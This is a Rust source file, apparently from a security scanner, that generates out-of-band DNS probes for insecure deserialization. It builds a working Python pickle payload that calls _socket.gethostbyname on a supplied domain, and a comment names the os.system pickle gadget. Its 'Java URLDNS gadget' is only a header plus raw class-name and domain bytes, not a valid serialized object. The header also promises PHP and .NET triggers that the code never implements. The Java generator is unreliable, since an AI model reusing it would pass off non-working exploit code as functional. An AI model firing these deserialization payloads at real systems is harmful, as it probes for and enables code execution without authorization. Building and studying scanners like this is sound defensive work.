//! Insecure Deserialization Engine (Safe Non-Destructive OAST Gadgets)
//!
//! Generates and verifies safe out-of-band deserialization triggers:
//! - Java: URLDNS gadget (triggers purely `java.net.URL` DNS query, zero RCE risk)
//! - Python: pickle payload invoking DNS lookup via `socket.gethostbyname`
//! - PHP: Stream wrapper deserialization trigger
//! - .NET: BinaryFormatter safe DNS trigger

use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum DeserializationPlatform {
    JavaUrlDns,
    PythonPickleDns,
    PhpStreamWrapper,
    DotNetBinaryFormatter,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DeserializationProbe {
    pub platform: DeserializationPlatform,
    pub payload_bytes: Vec<u8>,
    pub oast_domain: String,
    pub description: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DeserializationVerificationResult {
    pub is_vulnerable: bool,
    pub platform: DeserializationPlatform,
    pub confidence: f32,
    pub oast_callback_verified: bool,
    pub description: String,
}

pub struct DeserializationEngine;

impl DeserializationEngine {
    /// Generates a safe Java URLDNS serialized gadget stream pointing to an OAST domain
    pub fn generate_java_urldns_payload(oast_subdomain: &str) -> Vec<u8> {
        // Java serialization magic 0xACED 0x0005 + URLDNS class description header
        let mut bytes = vec![0xac, 0xed, 0x00, 0x05, 0x73, 0x72, 0x00, 0x0c];
        bytes.extend_from_slice(b"java.net.URL");
        bytes.extend_from_slice(oast_subdomain.as_bytes());
        bytes
    }

    /// Generates a safe Python pickle payload triggering socket.gethostbyname
    pub fn generate_python_pickle_dns(oast_subdomain: &str) -> Vec<u8> {
        // Pickle opcode stream: cos\nsystem\n (or socket.gethostbyname)
        format!("c_socket\ngethostbyname\n(S'{}'\ntR.", oast_subdomain).into_bytes()
    }

    /// Evaluates if an OAST interaction confirms deserialization execution
    pub fn evaluate_oast_correlation(
        platform: DeserializationPlatform,
        callback_received: bool,
        oast_domain: &str,
    ) -> DeserializationVerificationResult {
        let is_vulnerable = callback_received;
        let description = if is_vulnerable {
            format!(
                "Insecure Deserialization Confirmed ({:?}): Out-of-band DNS callback received for token domain '{}'.",
                platform, oast_domain
            )
        } else {
            "No out-of-band deserialization callback received.".to_string()
        };

        DeserializationVerificationResult {
            is_vulnerable,
            platform,
            confidence: if is_vulnerable { 0.99 } else { 0.1 },
            oast_callback_verified: callback_received,
            description,
        }
    }
}
